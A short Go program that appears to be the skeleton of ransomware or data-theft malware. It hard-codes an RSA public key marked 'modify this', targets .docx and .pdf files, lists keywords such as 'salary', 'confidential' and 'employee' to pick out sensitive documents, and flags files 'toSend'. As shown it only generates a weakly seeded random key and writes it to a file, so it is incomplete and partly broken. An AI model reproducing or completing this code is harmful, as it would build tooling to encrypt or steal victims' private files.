package main

import (
	"crypto/rsa"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"math/big"
	"math/rand"
	"os"
)

var (
	ToKeep           []string = []string{".*\\.docx", ".*\\.pdf"}
	SensitiveContent [][]byte = [][]byte{[]byte("confidential"), []byte("money"), []byte("salary"), []byte("address"), []byte("secret"), []byte("ID"), []byte("employee")}
)

type keeper struct {
	filename string
	toSend   bool
}

func fromBase10(base10 string) *big.Int {
	i, ok := new(big.Int).SetString(base10, 10)
	if !ok {
		panic("bad number: " + base10)
	}
	return i
}

var Key rsa.PublicKey

func init() {
	Key = rsa.PublicKey{
		N: fromBase10("28173238234479268692748171777584780950112726971800472303179518822064257035330343535382062519135554178057392050439512475197418759177681714996439478119637798431181217850091954574573450965244968320132378502502291379125779591047483820406235123169703702675102086669837722293492775826594973909630373982606134840347804878462514286834694538401513937386496705419688029997745683837628079207343818814366116867188449488550233959271590182601502875729623298406808420521843821837320643772450775606353905712230611517533654282258147082226740950169620818579409805061640251994478022087950933425934855126618181491816001603975662267491029"), // modify this
		E: 65537,
	}
}


// NewEncryptionKey generates a random 256-bit key for Encrypt() and
// Decrypt(). It panics if the source of randomness fails.
func NewEncryptionKey() *[32]byte {
	key := [32]byte{}
	rand.NewSource(Key.N.Int64())
	_, err := rand.Read(key[:])
	if err != nil {
		panic(err)
	}
	return &key
}


func main() {
	randomKey := NewEncryptionKey()
	fmt.Println(randomKey)
	fmt.Println(Key.N.Int64())
	if _, err := os.Stat("key_gotten.txt"); os.IsNotExist(err) {
		dst := make([]byte, hex.EncodedLen(len(randomKey[:])))
		hex.Encode(dst, randomKey[:])
		ioutil.WriteFile("key_gotten.txt", randomKey[:], 0644)
	}
}
